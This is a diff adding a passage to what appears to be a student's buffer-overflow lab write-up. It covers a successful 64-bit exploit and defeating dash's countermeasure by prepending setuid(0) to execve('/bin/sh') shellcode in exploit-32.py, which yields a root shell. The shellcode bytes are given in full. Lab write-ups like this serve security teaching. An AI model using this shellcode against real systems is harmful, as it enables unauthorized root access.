@@ -163,3 +163,28 @@ when we add 100 to ret we get segmentation faul
 when we add 208 we get illegal operation 
 150 is good 
 160 is good 
+In screenshot6.3 we see successful 64bit exploit
+# Defeating dash's Countermeasure
+In screenshot 7 we turn on the coutermeasure
+
+After adding setuid(0) invocation binary to the beggining of shellcode in call_shellcode.c and running a32.out, a64.out
+we get a root shell as expected. See screenshot 7.1. 
+If we dont add setuid(0) shellcoude to exploit-32.py, exploit does not work with countermeasure turned and we get a Segmentation fault error.
+Adding setuid(0) binary to exploit-32.py we now have
+```
+#!/usr/bin/python3
+import sys
+
+# Replace the content with the actual shellcode
+shellcode= (
+  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80" 	
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+  "\xd2\x31\xc0\xb0\x0b\xcd\x80" 
+).encode('latin-1')
+
+```
+we rm badfile from previous exploits and run ./exploit-32.py then run ./stackL1. 
+exploit works with countermeasures turned on see screenshot7.2.
+
+# Defeating Address Randomization
